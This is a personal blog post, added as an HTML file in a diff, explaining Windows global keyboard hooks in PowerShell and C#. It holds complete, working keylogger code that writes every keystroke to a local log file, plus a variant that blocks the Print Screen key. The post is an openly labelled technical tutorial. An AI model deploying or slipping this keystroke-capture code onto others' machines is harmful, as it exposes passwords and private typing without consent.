@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="The personal web site of Pete Hinchley." />
+    <title>Pete Hinchley: Creating a Key Logger via a Global System Hook using PowerShell</title>
+    <link rel="stylesheet" href="../main.css" />
+    <link rel="home" href="https://hinchley.net" />
+    <link rel="apple-touch-icon" sizes="180x180" href="../apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16x16.png" />
+    <link rel="manifest" href="../site.webmanifest" />
+  </head>
+  <body>
+    <header>
+      <h1><a href="../index.html">Pete Hinchley</a>: Creating a Key Logger via a Global System Hook using PowerShell</h1>
+    </header>
+    <main class="archive">
+      <p>Applications in Microsoft Windows are event-driven. The operating system generates messages in response to various conditions (e.g. the user moves the mouse, or clicks a button), and these messages are sent to application windows, where they are processed by a message handler. An application can also generate its own messages; either to manage its own windows, or to affect the behaviour of windows associated with other applications.</p>
+      <p>It is possible to write custom handlers (callbacks) that will hook into the event system and intercept messages sent to applications. After processing a message, the callback can discard it, or allow it to pass through to the next available handler.</p>
+      <p>There are two classes of event hook: local and global. A local hook will only respond to messages sent to a single application. A global system hook will respond to all messages sent within the desktop session of the thread that created the hook.</p>
+      <p>The following C# class (defined in PowerShell) uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx</a> to create a global hook that monitors low-level keyboard input events. The referenced callback then writes each key press to <em>log.txt</em>.</p>
+      <pre><code>Add-Type -TypeDefinition @&quot;
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace KeyLogger {
+  public static class Program {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+
+    private const string logFileName = &quot;C:\\Temp\\log.txt&quot;;
+    private static StreamWriter logFile;
+
+    private static HookProc hookProc = HookCallback;
+    private static IntPtr hookId = IntPtr.Zero;
+
+    public static void Main() {
+      logFile = File.AppendText(logFileName);
+      logFile.AutoFlush = true;
+
+      hookId = SetHook(hookProc);
+      Application.Run();
+      UnhookWindowsHookEx(hookId);
+    }
+
+    private static IntPtr SetHook(HookProc hookProc) {
+      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
+    }
+
+    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+      if (nCode &gt;= 0 &amp;&amp; wParam == (IntPtr)WM_KEYDOWN) {
+        int vkCode = Marshal.ReadInt32(lParam);
+        logFile.WriteLine((Keys)vkCode);
+      }
+
+      return CallNextHookEx(hookId, nCode, wParam, lParam);
+    }
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport(&quot;kernel32.dll&quot;)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+  }
+}
+&quot;@ -ReferencedAssemblies System.Windows.Forms
+
+[KeyLogger.Program]::Main();
+</code></pre>
+      <p>To test the program, save the code to <code>C:\Temp\Logger.ps1</code>, open a command prompt, change into <code>C:\Temp</code>, and run:</p>
+      <pre><code>powershell.exe -file Logger.ps1
+</code></pre>
+      <p>From this point forward, all keyboard activity will be logged to <code>C:\Temp\log.txt</code>. Kill the <em>powershell.exe</em> process via Task Manager to exit.</p>
+      <p>In theory, this code could be easily modified to support other event types. For example, you could change the title of all windows on the desktop by intercepting <em>WM_SETTEXT</em> messages (passing <em>WH_CALLWNDPROCRET</em> instead of <em>WH_KEYBOARD_LL</em> to <em>SetWindowsHookEx</em>). Unfortunately, due to a restriction placed on the use of global system hooks, this will not work.</p>
+      <p>Except for the <em>WH_KEYBOARD_LL</em> and <em>WH_MOUSE_LL</em> hook procedures, it is not possible to implement global hooks in the Microsoft .NET Framework. As described in <a href="https://www.betaarchive.com/wiki/index.php/Microsoft_KB_Archive/318804">KB318804</a>, the installation of a global hook requires the callback to be located within a DLL, and as standard Windows DLLs cannot be created using C# or VB.NET, it is not possible to implement global system hooks using managed code.</p>
+      <p><strong>Update: 2017-02-17</strong></p>
+      <p>The code shown above captures the key code of each key press, however, in some cases, you might want to capture the scan code.</p>
+      <p>The following quote from <a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input">this article</a> from Microsoft explains the difference between a scan code and key code:</p>
+      <blockquote>
+        <p>Assigned to each key on a keyboard is a unique value called a scan code, a device-dependent identifier for the key on the keyboard. ... The keyboard device driver interprets a scan code and translates (maps) it to a virtual-key code, a device-independent value defined by the system that identifies the purpose of a key.</p>
+      </blockquote>
+      <p>The process of reading the scan code involves marshalling the <em>lParam</em> value passed to the <em>HookCallback</em> function to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct">KBDLLHOOKSTRUCT structure</a>, and then reading the <em>scanCode</em> property. The following code provides a working demonstration.</p>
+      <p>Note: The code relies on the <a href="http://www.pinvoke.net/default.aspx/Structures/KBDLLHOOKSTRUCT.html">pinvoke singature</a> for <em>KBDLLHOOKSTRUCT</em>.</p>
+      <p>The example writes the scan code value of each key press to the console window, and as an added bonus, if it detects the value is 55 (which on my system, was the scan code of &quot;print screen&quot;), it gobbles up the key press by returning a non-zero value from the <em>HookCallback</em> method (i.e. prevents the key press from being &quot;processed&quot;, and hence stops the print screen button from working).</p>
+      <pre><code>Add-Type -TypeDefinition @&quot;
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace KeyLogger {
+  public static class Program {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+
+    private static HookProc hookProc = HookCallback;
+    private static IntPtr hookId = IntPtr.Zero;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public class KBDLLHOOKSTRUCT {
+      public uint vkCode;
+      public uint scanCode;
+      public KBDLLHOOKSTRUCTFlags flags;
+      public uint time;
+      public UIntPtr dwExtraInfo;
+    }
+
+    [Flags]
+    public enum KBDLLHOOKSTRUCTFlags : uint {
+      LLKHF_EXTENDED = 0x01,
+      LLKHF_INJECTED = 0x10,
+      LLKHF_ALTDOWN = 0x20,
+      LLKHF_UP = 0x80,
+    }
+
+    public static void Main() {
+      hookId = SetHook(hookProc);
+      Application.Run();
+      UnhookWindowsHookEx(hookId);
+    }
+
+    private static IntPtr SetHook(HookProc hookProc) {
+      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
+    }
+
+    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+      if (nCode &gt;= 0 &amp;&amp; wParam == (IntPtr)WM_KEYDOWN) {
+
+        KBDLLHOOKSTRUCT kbd = (KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
+        Console.WriteLine(kbd.scanCode); // write scan code to console
+
+        if (kbd.scanCode == 55) { return (IntPtr)1; }
+      }
+
+      return CallNextHookEx(hookId, nCode, wParam, lParam);
+    }
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport(&quot;user32.dll&quot;)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport(&quot;kernel32.dll&quot;)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+  }
+}
+&quot;@ -ReferencedAssemblies System.Windows.Forms
+
+[KeyLogger.Program]::Main();
+</code></pre>
+      <footer>
+        <p><span>Published: 2013-11-03</span> <span>Last Updated: 2017-02-17</span></p>
+      </footer>
+    </main>
+  </body>
+</html>
